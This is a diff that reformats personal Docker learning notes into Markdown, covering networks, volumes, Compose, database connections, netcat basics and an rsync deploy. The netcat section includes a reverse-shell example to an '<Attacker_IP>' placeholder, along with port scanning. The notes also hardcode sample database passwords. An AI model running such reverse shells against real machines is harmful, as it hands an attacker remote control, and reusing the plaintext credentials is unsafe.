@@ -1,14 +1,14 @@
-Docker Compose Tutorial for Beginners – Notes
+# Docker Compose Tutorial for Beginners – Notes
 
-1. Introduction to Docker Compose
+## Introduction to Docker Compose
 Docker Compose simplifies the management of multi-container applications.
 Uses a docker-compose.yml file to define services, networks, and volumes.
 Helps manage multiple containers with a single command (docker-compose up).
 
-Docker Networking:
-    To check network: docker network ls
-    To inspect: docker inspect [Network Name] 
-                ex: docker inspect bridge
+### Docker Networking:
+- To check network: docker network ls
+- To inspect: docker inspect [Network Name] 
+  - ex: docker inspect bridge
 
 when we inspect we can see its subnet and getway ip of driver.
 
@@ -145,18 +145,25 @@ A **custom bridge network** allows containers to communicate using their names.
 docker network create my-bridge-net
 
 # Run two containers in the same network
+```sh
 docker run -d --name container1 --network my-bridge-net -p 8080:8080 node-backend
 docker run -d --name container2 --network my-bridge-net -p 8081:8080 node-backend
+```
 
 Now we can use name to communicate between them
 
 Now, try to ping `container2` from `container1`:
+
+```sh
 docker exec -it container1 sh
 curl http://container2:8080/api/v1
+```
 
 Now, try to ping `container1` from `container2`:
 docker exec -it container2 sh
+```sh
 curl http://container1:8080/api/v1
+```
 
 ✅ **This will work** because `my-bridge-net` enables name-based communication.
 
@@ -164,7 +171,9 @@ curl http://container1:8080/api/v1
 
 ### 3. Inspecting a Bridge Network
 To see details of your custom bridge network:
+```sh
 docker network inspect my-bridge-net
+```
 
 This shows connected containers and network configurations.
 
@@ -172,14 +181,16 @@ This shows connected containers and network configurations.
 
 ### 4. Connecting an Existing Container to a Bridge Network
 If a container is already running, you can attach it to a custom bridge network:
+```sh
 docker network connect my-bridge-net container1
-
+```
 
 ---
 
 ### 5. Disconnecting a Container from a Network
+```sh
 docker network disconnect my-bridge-net container1
-
+```
 
 ---
 
@@ -189,14 +200,19 @@ docker stop container1 container2
 docker rm container1 container2
 
 Then, remove the network:
+```sh
 docker network rm my-bridge-net
-
+```
 
 ---
 
+```sh
 docker run --name node-docker-container -d -e PORT=8080 -p 8080:8090 --rm  ajayjb/node-docker
+```
 
 we dont need to give all above flags, we use docker compose 
+
+---
 
 This setup ensures containers within the same **custom bridge network** can communicate using their **names**, improving flexibility and isolation
 
@@ -225,36 +241,55 @@ Docker volumes are a way to persist data generated and used by Docker containers
 
 ## Managing Docker Volumes
 ### Creating a Volume
+```sh
 docker volume create my_volume
+```
 
 ### Listing Volumes
+```sh
 docker volume ls
+```
 
 ### Inspecting a Volume
+```sh
 docker volume inspect my_volume
+```
 
 ### Removing a Volume
+```sh
 docker volume rm my_volume
+```
 
 ### Removing All Unused Volumes
+```sh
 docker volume prune
+```
 
 ## Using Volumes in Containers
 ### Mounting a Volume in a Container
+```sh
 docker run -d --name my_container -v my_volume:/data my_image
+```
 This mounts `my_volume` to `/data` inside the container.
 
 ### Using Bind Mounts
+```sh
 docker run -d --name my_container -v /host/path:/container/path my_image
+```
 
 ### Read-Only Volumes
+```sh
 docker run -d --name my_container -v my_volume:/data:ro my_image
 The `:ro` flag makes the volume read-only.
+```
+
+---
 
 ## Using Volumes in Docker Compose
 Docker Compose allows defining and managing volumes within a `docker-compose.yml` file.
 
 ### Defining Volumes in `docker-compose.yml`yaml
+```yml
 version: '3.8'
 services:
   app:
@@ -268,24 +303,35 @@ services:
 volumes:
   my_volume:
   db_data:
+```
 
 ### Running Docker Compose with Volumes
+```sh
 docker-compose up -d
+```
 This starts the services and ensures volumes are created and attached.
 
 ### Listing Volumes in Docker Compose
+```sh
 docker volume ls
+```
 
 ### Removing Docker Compose Volumes
+```sh
 docker-compose down -v
+```
 This removes containers, networks, and volumes defined in `docker-compose.yml`.
 
 ## Backing Up and Restoring Volumes
 ### Backup a Volume
+```sh
 docker run --rm -v my_volume:/data -v $(pwd):/backup busybox tar czf /backup/backup.tar.gz -C /data .
+```
 
 ### Restore a Volume
+```sh
 docker run --rm -v my_volume:/data -v $(pwd):/backup busybox tar xzf /backup/backup.tar.gz -C /data
+```
 
 ## Conclusion
 Docker volumes are essential for managing persistent data in containerized applications. They offer flexibility, security, and ease of use compared to traditional file-mounting techniques. Understanding how to create, use, and manage volumes efficiently can significantly enhance Docker’s capabilities in production environments.
@@ -293,23 +339,39 @@ Docker volumes are essential for managing persistent data in containerized appli
 
 connect to mongo container
 From Inside container
+```sh
 mongosh --username "test_user" --password "Admin@123" --authenticationDatabase "admin"  --host "localhost" --port 27017
 mongosh --username "test_user" --password "Admin@123" --authenticationDatabase "admin"
+```
 
-From Inside container with port mapping 5005:27017
-mongodb://test_user:Admin@123@localhost:5005/?authSource=admin
+If container with port mapping is 5005:27017
+- Connect From Outside
+```sh
+ mongosh mongodb://test_user:Admin@123@localhost:5005/?authSource=admin
+```
+- Connect inside the same network if service name in mongo
+```sh
+ mongosh mongodb://test_user:Admin@123@mongo:27017/?authSource=admin
+```
 
 psql commands :---
+
+```sh
 create user backend_user with encrypted password 'devopsPg123';
 grant all privileges on database mydb to backend_user;
 grant all privileges on all tables in schema public to backend_user;
 grant all privileges on all sequences in schema public to backend_user;
+```
 
 Netcat (`nc`) is a versatile networking tool used for reading from and writing to network connections. You can use it for port scanning, file transfers, simple chat servers, and more.
 
 ### Basic Usage
 #### 1. Check if Netcat is Installedsh
+
+```sh
 nc -h
+```
+
 If not installed, install it using:
 - **Ubuntu/Debian**: `sudo apt install netcat`
 - **CentOS/RHEL**: `sudo yum install nc`
@@ -318,30 +380,41 @@ If not installed, install it using:
 
 #### 2. Simple TCP Server & Client
 - Start a listener on port 1234:
+```sh
 sh
   nc -l 1234
+```
 
 - Connect to the listener from another terminal or machine:
+```sh
 sh
   nc <server-ip> 1234
-
+```
 
 #### 3. Transfer a File
 - On the sender side:
+```sh
 sh
   cat file.txt | nc <receiver-ip> 1234
+```
 
 - On the receiver side:
+```sh
 sh
   nc -l 1234 > received.txt
-
+```
 
 #### 4. Port Scanningsh
+```sh
 nc -zv <target-ip> 20-1000
+```
+
 (`-z` = scan without sending data, `-v` = verbose mode)
 
 #### 5. Send HTTP Request Manuallysh
+```sh
 echo -e "GET / HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
+```
 
 This guide provides a basic overview of Netcat usage. Modify commands as needed for your use case.
 
@@ -352,57 +425,95 @@ Netcat (`nc`) is a powerful networking tool for reading from and writing to netw
 ---
 
 ### **1. Check if a Port is Open**
+```sh
 nc -zv <hostname or IP> <port>
+```
 Example:
+```sh
 nc -zv google.com 443
+```
 This checks if port 443 is open on google.com.
 
 ---
 
 ### **2. Simple Chat Between Two Machines**
 #### On Machine 1 (Start a listener on port 1234):
+```sh
 nc -l -p 1234
+```
 #### On Machine 2 (Connect to Machine 1):
+```sh
 nc <Machine1_IP> 1234
+```
 Now, both machines can send and receive messages.
 
 ---
 
 ### **3. Transfer Files Over Network**
 #### On Sender Machine:
+```sh
 cat file.txt | nc <Receiver_IP> 1234
+```
 #### On Receiver Machine:
+```sh
 nc -l -p 1234 > received.txt
-
+```
 ---
 
 ### **4. Create a Simple Web Server**
+```sh
 echo -e "HTTP/1.1 200 OK\n\nHello, World!" | nc -l -p 8080
+```
 Now, opening `http://localhost:8080` in a browser will display "Hello, World!".
 
 ---
 
 ### **5. Scan for Open Ports on a Remote Host**
+```sh
 nc -z -v <hostname or IP> 20-1000
+```
 Scans ports 20 to 1000 and lists the open ones.
 
 ---
 
 ### **6. Establish a Reverse Shell (for Penetration Testing)**
 #### On Attacker Machine (Listening Mode):
+```sh
 nc -l -p 4444 -e /bin/bash
+```
 #### On Victim Machine (Initiate Connection):
+```sh
 nc <Attacker_IP> 4444 -e /bin/bash
+```
 The attacker gains a shell on the victim's machine.
 
 ---
 
 ### **7. Send HTTP Request Using netcat**
+```sh
 echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
+```
 Sends an HTTP request to `example.com` and prints the response.
 
 ---
 
 Netcat is a versatile tool useful for networking, troubleshooting, and penetration testing.
 
+```sh
 curl -X GET "http://node-app:8080/about"
+```
+
+
+```sh
+curl -X POST "http://node-app:8080/post"
+```
+
+## STAGING in nginx certbot environment
+
+1 means we use letsencrypt testing envriroment issue certificate, 0 means production cerficates are limited in this production envriroment
+
+```sh
+rsync -avz --exclude="**/node_modules/" --exclude=".git" -e "ssh -i ~/Documents/practice-projects/aws/docker-node.pem" . ubuntu@13.201.227.214:/var/www/docker-learn
+```
+
+
